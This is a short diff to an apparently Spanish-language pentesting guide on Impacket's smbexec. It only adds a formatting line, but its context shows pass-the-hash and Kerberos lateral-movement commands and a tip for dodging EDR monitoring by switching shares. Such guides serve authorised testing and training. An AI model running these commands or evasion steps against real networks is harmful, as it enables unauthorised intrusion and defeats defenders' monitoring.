@@ -25,6 +25,8 @@ impacket-smbexec -hashes :HASH_NT dominio.local/usuario_admin@IP_OBJETIVO -share
 ```
 > Por defecto, smbexec utiliza el recurso compartido ADMIN$ para almacenar temporalmente las respuestas de los comandos. Si los sistemas EDR monitorizan de cerca este recurso, puedes forzar el uso de C$ o cualquier otro share alternativo:
 
+</br>
+
 ```
 impacket-smbexec -k -no-pass dominio.local/usuario_admin@NOMBRE_HOST_FQDN
 ```
